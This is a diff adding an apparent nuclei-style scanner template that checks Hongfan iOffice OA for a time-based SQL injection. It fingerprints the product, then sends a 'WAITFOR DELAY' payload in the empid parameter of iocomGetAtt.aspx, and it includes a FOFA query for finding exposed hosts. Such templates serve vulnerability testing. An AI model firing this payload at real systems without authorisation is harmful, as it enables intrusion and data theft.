@@ -1,0 +1,44 @@
+id: poc-yaml-hongfan-ioffice-iocomgetatt-sqli
+info:
+  name: 红帆OA iocomGetAtt SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: iOffice
+    fofa: app="红帆-ioffice"
+
+variables:
+  t1: "{{rand_int(5,7)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "iOffice.net"
+  
+  - raw:
+      - |
+        GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
